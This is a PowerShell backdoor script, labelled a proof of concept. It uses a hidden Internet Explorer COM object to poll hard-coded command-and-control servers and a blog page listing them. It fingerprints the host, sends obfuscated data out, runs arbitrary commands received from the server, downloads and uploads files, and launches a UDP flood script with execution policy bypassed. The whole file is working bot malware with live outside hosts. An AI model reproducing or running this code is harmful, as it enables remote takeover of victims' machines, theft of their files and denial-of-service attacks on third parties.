<#
powershell IE backdoor PoC

Uses an IE COM object as the C2 channel
Requires a php/aspx page with a <> tag in it. 
see http://khr0x40sh.wordpress.com/
for details

PARAMS:
[1] server - url to connect to.  Right now we are just looking for a comment in the source
[2] dwell  - time (sec) between polls
[3] debug  - show the debugging info as well as the IE window

Powered by
khr0x40sh
khr0x40sh.wordpress.com
#>
Param(
$server = "7.22.20.173",
$dwell = 5,
$debug = $false,
$check=12
);

function runCMD{
Param(
$cmd_str = "ipconfig"
);
$out = ""

$ps = new-object System.Diagnostics.Process
$ps.StartInfo.Filename = "cmd"
$ps.StartInfo.Arguments = "/C " + $cmd_str
$ps.StartInfo.RedirectStandardOutput = $True
$ps.StartInfo.RedirectStandardError = $True
$ps.StartInfo.UseShellExecute = $false
$ps.start()
$ps.WaitForExit()
[string] $Out = $ps.StandardOutput.ReadToEnd();
[string] $err = $ps.StandardError.ReadToEnd();

if ($err)
{
    $out = "E:"+$err + $out
}
$out.ToString()
}

function Rot47 { param ([string] $in)  
    $table = @{}
    for ($i = 0; $i -lt 94; $i++) {
        $table.Add(
            "!`"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_``abcdefghijklmnopqrstuvwxyz{|}~"[$i],
            "PQRSTUVWXYZ[\]^_``abcdefghijklmnopqrstuvwxyz{|}~!`"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO"[$i])
    }
    
    $out = New-Object System.Text.StringBuilder 
    $in.ToCharArray() | %{
        $char = if ($table.ContainsKey($_)) {$table[$_]} else {$_}
        $out.Append($char) | Out-Null
    }
    $out.ToString()
}

function de64
{
	Param([string]$str);
    $swap = $str.Replace("%2B", "+")
    $fr64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($swap))
    $fr47 = Rot47 $fr64 
	return $fr47;
}

function en64
{
	Param([string]$str);
    $r47 = Rot47 $str
    [byte[]] $by64 = [System.Text.Encoding]::UTF8.GetBytes($r47)
    [string] $to64 = [System.Convert]::toBase64String($by64)
    $to64 = $to64 -replace '[\+]', "%2B"
	return $to64;
}

function New-Task([int]$Index,[scriptblock]$ScriptBlock) {
    $ps = [Management.Automation.PowerShell]::Create()
    $res = New-Object PSObject -Property @{
        Index = $Index
        Powershell = $ps
        StartTime = Get-Date
        Busy = $true
        Data = $null
        async = $null
    }

    [Void] $ps.AddScript($ScriptBlock)
    [Void] $ps.AddParameter("TaskInfo",$Res)
    $res.async = $ps.BeginInvoke()
    $res
}

function ConvertTo-UnixTimestamp {
    $epoch = Get-Date -Year 1970 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0
    $input | %{$milliseconds = [math]::truncate($_.ToUniversalTime().Subtract($epoch).TotalSeconds);Write-Output $milliseconds}
}

function randomInt {
Param($small=0, $large=100);
    $seed = Get-Date | ConvertTo-UnixTimeStamp
    $rand = new-object System.Random $seed
    $out = $rand.Next($small,$large)
    $out
}


##################
#  POST params
#####

function pc
{
	[string] $pc = [System.Environment]::MachineName
	return $pc
}

function idu
{
	[string] $serial = serial
	[string] $pc = pc
	[string] $hash = $serial +""+ $pc
	[string] $str = hash $hash "MD5"
	return $str
}
function hash
{
	Param([string]$str, [string]$type);
	$StringBuilder = New-Object System.Text.StringBuilder
	[System.Security.Cryptography.HashAlgorithm]::Create($type).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($str))|%{
	[Void]$StringBuilder.Append($_.ToString("x2"))
	}
	return $StringBuilder.ToString()
}

function serial
{
	[string]$HD = [System.Environment]::CurrentDirectory.SubString(0,1);
	[string] $ret = ""
	
	if ([environment]::OSVersion.Version.Major -lt 6)
	{
		#xp mode
		$str_hd = "win32_logicaldisk.deviceid=`""+$HD+":`""
		$m_hd = new-object System.Management.ManagementObject $str_hd
		$m_hd.Get()
		$ret = $m_hd["VolumeSerialnumber"].ToString()
	} else {
		$query = "SELECT Serialnumber FROM Win32_Volume WHERE Name='"+ $HD +":\\'";
		$m_hd = Get-WMIObject -Query $query
		$ret = $m_hd["SerialNumber"].ToString()
	}
	return $ret
}
#################

##############
# BOT Commands
######
function download
{
Param([string]$UA = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
[string] $source,
[string] $dest);
[string] $status =""
try
{
	# can't force IE to download yet, so using powershell for now
	$client = New-Object System.Net.Webclient
	$client.Headers.Add("user-agent", $UA)
	$client.DownloadFile($source,$dest)
}
catch
{
	$status = "Failed `n"
}
#check to ensure file does exist
If (Test-path $dest)
{
	$status = "File downloaded!"
}
else
{
	$status = $status + "File missing!"
}
#report back download complete
	return $status
}

function upload
{
Param($site,$source);
$site = $site + "/access.php" 

$client = New-Object System.Net.WebClient
$client.Headers.Add("user-agent", $UA)
    if (Test-path $source)
    {
        if(Test-path $source -pathtype container)
        {
            foreach ($f in $source)
            {
                $client.UploadFile($site,$f);
            }
        }
        else
        {
            $client.UploadFile($site,$source)
        }
    }
    else
    {
        #push error message
    }
}

####################

function popIE{
        $ie = New-Object -COM internetexplorer.application

        $ie.visible = $debug  #visibility set by the debug param
        $ie.navigate("http://128.242.240.52/index.php/khr0x40sh")
        
        while($ie.Busy)
        {
            Sleep 3
        }
        $twitter = $ie.Document.Body.getElementsByTagName("p")
        $i6 = 0
        [string[]]$t_serv 
        $hash1=""
        try
        {
            foreach($t2 in $twitter)
            {
                if($t2.OuterHTML.ToLower().Contains("entry-content"))
                {
                    $hash1 = $t2.InnerHTML
                    break                 
                }
            }
            $from64_hash = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hash1))
            $t_serv = $from64_hash.Split(';')
        }
        catch
        {
            $t_serv =  {$server}
        }
        
        [string] $pass = hash "1qazXSW@" "MD5"
        [string] $idu = idu
        $pre="user=19820121&pass="+$pass+"&idu="+$idu
        
        [string] $data=""
        [string] $comm=""
        $MaxRunspaces = 3
        
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxRunspaces)
        $pool.Open()

        $jobs = @()  
        $ps = @()  
        $wait = @()   
        $k=0;

        while ($true)
        {
            if($i6 -eq $check)
            {
                $ie.navigate2("http://128.242.240.52/index.php/khr0x40sh")
                $twitter
                $i6 = 0
            }
            $p1 = pc
        	$p = en64 $p1
        	$t = en64 "10000"
        	$c = en64 $comm
            try {if ($data.substring(0,5).Contains("True")){$data=$data.substring(5,$data.Length-5)}}catch{$data=""}
            $q = en64 $data
        	$Data1 = $pre+"&p="+$p+"&t="+$t+"&c="+$c+"&q="+$q
            
            $enc = New-Object System.Text.ASCIIEncoding 
            $pData = $enc.GetBytes($Data1) 
            $brFlgs = 14 #// no history, no read cache, no write cache
            $header = "Content-Type: application/x-www-form-urlencoded"
            $t_serv_new =""
            if ($t_serv.Count -lt 2)
            {              
                $t_serv_new = "http://" + $t_serv[0]
            }
            else
            {
                $r2 = randomInt 0 $t_serv.Count+1 
                $t_serv_new = "http://" + $t_serv[$r2] 
            }
            
            $ie.navigate2($t_serv_new + "/login.php", $brFlags, 0, $pData, $header)
            
            while ($ie.Busy)
            {
                #still loading so let's wait
                Sleep 3
            }
                
                #if we have a cert we need to force accept
                $ieHTML = $ie.Document.url
                if ($ieHTML.Contains("invalid"))
                {
                    $A = $ie.Document.getElementsByTagName("a")
                    foreach ($aa in $A)
                    {
                        if ($aa.innerText.toLower().Contains("continue to this website"))
                        {
                            $aa.Click();
                            break;
                        }
                    }
                }
                else
                {
                    #get our designated tag that contains our code
                    $tags = $ie.Document.getElementsBytagname("pre")
                    foreach ($tag in $tags)
                    {
                        Write-Verbose "Available Runspaces: $($pool.GetAvailableRunspaces()-1)" 
                        
                        $de64 = de64 $tag.innerText
                        $switched = $de64.Split(' ')
                        
                        switch($switched[0])
                        {
                            stop{[string]$data="";$comm="";break}
                            kill{Exit;break}
                            wipe{"TBD kill and clean";break}
                            download{download $de64[1] $de64[2];break}
                            upload{
                                    $path1=""
                                    for($x=1;$x -lt $switched.Count;$x++)
                                    {
                                        $path1=$path1 + $Switched[$x]
                                    }
                                    upload $t_serv_new $path1
                                    break;
                                  }
                            udp{
                                    
                                    $de64r = $de64.Replace(" ",",")
                                    [string] $src = [Environment]::CurrentDirectory
                                    [string] $tsk = $src+"\udpflood.ps1"
                                    
                                    $a = New-Object -ComObject Scripting.FileSystemObject
                                    $f = $a.GetFile($tsk)
                                    $tsk = $f.ShortPath
                                    Write-Host $tsk
                                    $udp1 = $de64r
                                    
                                    
                                    
                                    if ($item.State -ne "Running")
                                    {
                                        $item = Start-Job -ScriptBlock {Param($tsk,$udp1); $tsk = "`""+$tsk+"`""; Write-Host $tsk; Write-host $udp1; powershell.exe -exec Bypass $tsk $udp1} -argumentList $tsk,$udp1
                                        Get-Job | Receive-Job
                                        $item.State
                                    }
                                    break;
                                }
                             udpoff
                             {
                                if ($item.State -eq "Running")
                                {
                                   Stop-Job $item
                                }
                                break;
                             }
                            default{$data= runCMD $de64; $comm = $de64; break;}
                        }   
                    }
                    
                    #if searching for HTML comment use below:
                    
                }
            Sleep $dwell
            $ie6++
        }
}


$ret = popIE